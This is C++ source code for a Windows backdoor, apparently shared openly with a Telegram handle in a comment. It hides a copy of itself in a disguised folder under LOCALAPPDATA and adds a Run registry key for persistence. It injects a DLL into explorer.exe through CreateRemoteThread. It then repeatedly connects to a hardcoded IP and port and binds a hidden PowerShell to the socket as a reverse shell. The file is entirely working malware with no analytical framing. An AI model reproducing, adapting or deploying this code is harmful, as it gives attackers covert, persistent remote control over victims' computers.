#include <ws2tcpip.h>
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <process.h>
#include <iostream>
#include <string>
#include <wchar.h>
#include <Shlwapi.h>
#include <TlHelp32.h>

using namespace std;

// t.me/afterpeice

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib")

std::string commander = "172.29.226.172";
std::string street = "0009";

void AddToStartup(const std::string& fullPath) {
    HKEY hKey;
    const char* czStartName = "$9dollarnine";

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {

        RegSetValueExA(hKey, czStartName, 0, REG_SZ, (BYTE*)fullPath.c_str(), fullPath.length());
        RegCloseKey(hKey);
    }
}

bool CopyToHiddenFolder(const std::string& sourcePath, const std::string& targetPath) {
    if (!CopyFileA(sourcePath.c_str(), targetPath.c_str(), FALSE)) {
        return false;
    }
    SetFileAttributesA(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    return true;
}

void InitAndCopyFiles() {
    char originalPath[MAX_PATH];
    GetModuleFileNameA(NULL, originalPath, MAX_PATH);

    char appDataPath[MAX_PATH];
    if (GetEnvironmentVariableA("LOCALAPPDATA", appDataPath, MAX_PATH) == 0) {
        return;
    }

    // Create target directory
    std::string targetDir = std::string(appDataPath) + "\\$9TaskHostW";
    if (!CreateDirectoryA(targetDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        return;
    }
    SetFileAttributesA(targetDir.c_str(), FILE_ATTRIBUTE_HIDDEN);

    // Get source directory
    char sourceDir[MAX_PATH];
    strcpy_s(sourceDir, originalPath);
    PathRemoveFileSpecA(sourceDir);

    // Copy executable
    std::string targetExePath = targetDir + "\\$9dollarnine.exe";
    if (!CopyToHiddenFolder(originalPath, targetExePath)) {
        return;
    }

    // Copy DLL if it exists
    std::string sourceDllPath = std::string(sourceDir) + "\\do.dll";
    if (GetFileAttributesA(sourceDllPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        std::string targetDllPath = targetDir + "\\do.dll";
        CopyToHiddenFolder(sourceDllPath, targetDllPath);
    }

    AddToStartup(targetExePath);
}

DWORD GetExplorerPID() {
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (Process32First(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return 0;
}

bool InjectDLL(const std::string& dllPath) {
    if (GetFileAttributesA(dllPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return false;
    }

    DWORD pid = GetExplorerPID();
    if (pid == 0) {
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (hProcess == NULL) {
        return false;
    }

    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, dllPath.size() + 1,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pDllPath == NULL) {
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, pDllPath, dllPath.c_str(), dllPath.size() + 1, NULL)) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (pLoadLibrary == NULL) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary, pDllPath, 0, NULL);
    if (hThread == NULL) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);

    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return (exitCode != 0);
}

int main(int argc, char* argv[])
{
    InitAndCopyFiles();
    FreeConsole();

    char appDataPath[MAX_PATH];
    if (GetEnvironmentVariableA("LOCALAPPDATA", appDataPath, MAX_PATH) == 0) {
        return -1;
    }

    std::string dllPath = std::string(appDataPath) + "\\$9TaskHostW\\do.dll";

    if (!InjectDLL(dllPath)) {
        return -1;
    }

    WSADATA wsaData;
    SOCKET ConnectSocket;
    int  programme = WSAStartup(MAKEWORD(2, 2), &wsaData);
    struct addrinfo* out = NULL, * ptr = NULL, hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    while (true) {
        getaddrinfo(commander.c_str(), street.c_str(), &hints, &out);
        ptr = out;
        ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);

        if (connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
            Sleep(5000);
            continue;
        }

        STARTUPINFO star;
        PROCESS_INFORMATION pr;
        ZeroMemory(&star, sizeof(star));
        star.cb = sizeof(star);
        ZeroMemory(&pr, sizeof(pr));
        star.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        star.wShowWindow = SW_HIDE;
        star.hStdInput = (HANDLE)ConnectSocket;
        star.hStdOutput = (HANDLE)ConnectSocket;
        star.hStdError = (HANDLE)ConnectSocket;
        TCHAR call[] = TEXT("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
        CreateProcess(NULL, call, NULL, NULL, TRUE, 0, NULL, NULL, &star, &pr);
        WaitForSingleObject(pr.hProcess, INFINITE);
        CloseHandle(pr.hProcess);
        CloseHandle(pr.hThread);

        closesocket(ConnectSocket);
    }

    WSACleanup();
}